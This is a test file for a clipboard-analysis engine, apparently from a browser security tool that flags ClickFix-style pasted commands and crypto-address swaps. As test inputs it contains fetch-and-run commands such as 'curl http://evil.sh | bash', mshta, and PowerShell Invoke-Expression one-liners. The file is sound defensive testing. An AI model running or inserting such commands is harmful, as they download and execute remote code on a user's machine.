'use strict';
const test = require('node:test');
const assert = require('node:assert');
const { analyzeClipboardWrite, clipboardTier } = require('../../engine/clipboard_rules');

test('PowerShell payload is dangerous', () => {
  const r = analyzeClipboardWrite('powershell -enc SQBFAFgA...');
  assert.strictEqual(r.level, 'dangerous');
  assert.ok(r.reasons.some((x) => x.code === 'clipboardCommand' && x.kind === 'clipboard'));
});

test('curl pipe bash is dangerous', () => {
  assert.strictEqual(analyzeClipboardWrite('curl http://evil.sh | bash').level, 'dangerous');
});

test('mshta / Invoke-Expression is dangerous', () => {
  assert.strictEqual(analyzeClipboardWrite('mshta http://x/a.hta').level, 'dangerous');
  assert.strictEqual(analyzeClipboardWrite('iex(New-Object Net.WebClient)').level, 'dangerous');
});

test('bare ETH address is suspicious (address-swap)', () => {
  const r = analyzeClipboardWrite('0x' + 'a'.repeat(40));
  assert.strictEqual(r.level, 'suspicious');
  assert.ok(r.reasons.some((x) => x.code === 'clipboardCryptoAddress'));
});

test('normal text is safe', () => {
  assert.strictEqual(analyzeClipboardWrite('Hello, here is the article link.').level, 'safe');
  assert.strictEqual(analyzeClipboardWrite('').level, 'safe');
  assert.strictEqual(analyzeClipboardWrite(null).level, 'safe');
});

test('clipboardTier table (0.15.0): selectionMatches decides, gesture-copies never notice', () => {
  const T = clipboardTier;
  assert.strictEqual(T({ level: 'safe', clickfixLevel: 'dangerous', userGesture: true, selectionMatches: false }), 'none');
  // The user chose to copy what they saw: nothing, even for a shell command or a clickfix-looking page.
  assert.strictEqual(T({ level: 'dangerous', clickfixLevel: 'none', userGesture: true, selectionMatches: true }), 'none');
  assert.strictEqual(T({ level: 'dangerous', clickfixLevel: 'dangerous', userGesture: true, selectionMatches: true }), 'none');
  // A page that wrote something other than what the user selected is the ClickFix shape.
  assert.strictEqual(T({ level: 'dangerous', clickfixLevel: 'dangerous', userGesture: true, selectionMatches: false }), 'block');
  assert.strictEqual(T({ level: 'dangerous', clickfixLevel: 'dangerous', userGesture: false, selectionMatches: false }), 'block');
  assert.strictEqual(T({ level: 'dangerous', clickfixLevel: 'dangerous', userGesture: false }), 'block');
  // Without a verified mismatch a gesture copy is not blocked.
  assert.strictEqual(T({ level: 'dangerous', clickfixLevel: 'dangerous', userGesture: true }), 'notice');
  assert.strictEqual(T({ level: 'dangerous', clickfixLevel: 'suspicious', userGesture: true, selectionMatches: false }), 'notice');
  assert.strictEqual(T({ level: 'suspicious', clickfixLevel: 'none', userGesture: true, selectionMatches: false }), 'notice');
  assert.strictEqual(T({ level: 'dangerous', clickfixLevel: 'none', userGesture: false }), 'warn');
  assert.strictEqual(T({ level: 'dangerous', clickfixLevel: 'none', userGesture: false, selectionMatches: true }), 'warn');
  assert.strictEqual(T({}), 'none');
});

test('normalizeCopyText + copyMatches: whitespace-insensitive full-text comparison', () => {
  const { normalizeCopyText, copyMatches } = require('../../engine/clipboard_rules');
  assert.strictEqual(normalizeCopyText('  a \n\t b  '), 'a b');
  assert.strictEqual(copyMatches('irm x | iex', ['Open it', 'irm  x |\n iex']), true);
  assert.strictEqual(copyMatches('irm x | iex', ['something else', '']), false);
  assert.strictEqual(copyMatches('', ['', '']), false);
  assert.strictEqual(copyMatches('abc', []), false);
});

